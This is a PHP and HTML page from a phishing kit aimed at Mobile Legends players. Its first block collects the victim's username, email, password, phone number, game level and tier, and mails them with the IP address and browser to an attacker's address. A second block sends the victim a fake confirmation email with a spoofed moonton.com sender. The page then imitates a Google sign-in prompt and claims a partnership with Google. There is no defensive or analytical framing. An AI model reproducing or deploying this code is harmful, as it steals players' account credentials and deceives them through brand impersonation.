<?php
$name = $_POST['name'];
$email = $_POST['email'];
$pw = $_POST['pw'];
$no = $_POST['no'];
$lv = $_POST['lv'];
$login = $_POST['login'];
$tier = $_POST['tier'];
$country = $_POST['country'];


$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$link = $_SERVER['SERVER_NAME'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$body = "
+======[ Mobile Legend ]======+

• Username : ".$name."
• Email : ".$email."
• Password : ".$pw."
• Email Recovery : ".$emailr."
• Nomor Hape : ".$no."
• Level : ".$lv."
• Login Dengan : ".$login."
• Level Tier : ".$tier."
• Negara : ".$country."

+======[ Device Information ]======+

• Ip Address : ".$ip." | ".$today."
• Browser : ".$browser."



";

include 'email.php';
$subject ="Setoran Mobile Legend [ ".$lv." ] Punya [ ".$name." ]";
$headers ="From: • MOBILE LEGEND • <Support@Ilhamxshop.Com>";
$success = mail($mailto, $subject, $body, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<!-- 
###########################
##   Coding By Dzaky Khun           ##
##   Fb: fb.com/ceo.xcraftstore   ##
##   www.dzakypedia.tk               ##
##########################
-->

<?php
$email = $_POST['email'];
$country = $_POST['country'];
$name = $_POST['name'];
  

$emailkamu = "$email";
$tomail = "$emailkamu";
  
$subject = "Information Message";
$message = "
<center>
Dear ".$name."
<br>
Your Request Has Been Processed, Please Wait 2 Hours<br>
<br>
User Information :<br>
Username : <b>".$name."</b><br>
Email : <b>".$email."</b><br>
Country : <b>".$country."</b><br>
<br>
</center>
 ";
  
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Mobile Legend <no-reply@moonton.com>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
?>
  
<!DOCTYPE html>
<html> 
<head> 
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"><link href='king.jpg' rel='icon'><title>Succes Send Request [ Lucky Prize ]</title><script src="js/jquery.min.js"></script><link rel="stylesheet" href="js/bootstrap.min.css"><style>h1, .h1, h2, .h2, h3, .h3 { margin-top: 0px; margin-bottom: 10.5px;}body { background: url(cr2.jpg) no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;}.error-msg { margin: .5em 0; display: block; color: #dd4b39; line-height: 17px;}.col-md-6 { margin:0 auto; float:none;
}.col-md-12 { margin:0 auto; float:none;
}</style>
<body style="padding:0px;margin:0 auto;"><div style="padding:0px;margin:0 auto;" class="container ">
<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6"><div style="border:none;padding:0px;margin:0px;" class="well well-sm"><img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="header.jpg"/><input type="submit" class="btn btn-block" style="color: white;background-color: red;" value="Welcome To Event Mobile Legend"> </div></div><center style="background:white;"><br><div class="col-md-12"><h2><img src="moba.png"></h2><h3> This Form Secured By Moba Form.</h3><div style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal"><br/><div class="RWIGQ" jsname="OKwYj"><div class="CGVQsc"></div></div><div class="FSCHRd"><div class="aGMYPd" jsname="uPuGNe" role="heading" aria-level="2" tabindex="-1">The Last Step</div><div class="lIbrjf gS2Bvc">Please Tap Yes To Continue. <span jsname="vMgoNd" style="display: none;">Click <b>Next</b> to continue.</span><div class="oOOyEb" jsname="bN97Pc"><div class="swjrDd"><img src="https://ssl.gstatic.com/accounts/marc/authzen_signin.gif" width="125" alt=""></div><div class="m92mTb" role="heading" aria-level="3">Unlock your Phone</div><div class="BvQA9c">Tap <b>Yes</b> on the Google prompt to continue.</div> </div></div><br><br>
<h4>Confirmation Account</h4>We Will Send Message Confirmation<br> To Your Account Check Confirm In Your Email.<br><br>
Please Check Your Inbox or Spam In Your Account <br><br>
<div style="width:100%" class="form-group"> <a href="https://accounts.google.com/ServiceLogin?service=mail&amp;passive=1209600&amp;osid=1&amp;continue=https://mail.google.com/mail/mu/mp/84/?login%3D1&amp;followup=https://mail.google.com/mail/mu/mp/84/?login%3D1&amp;btmpl=mobile&amp;ltmpl=mobile#tl/Kotak%20Masuk" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit">Check Your Inbox</a></div><b>Or</b><div style="width:100%" class="form-group"> <a href="index.html" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> Logout </a></div></div></div><br><center><a href="#"></a></center><div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block"><center><p>Cooperate With Google</p></center><img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/><p>Copyright &copy; 2017 X-Tools.</p>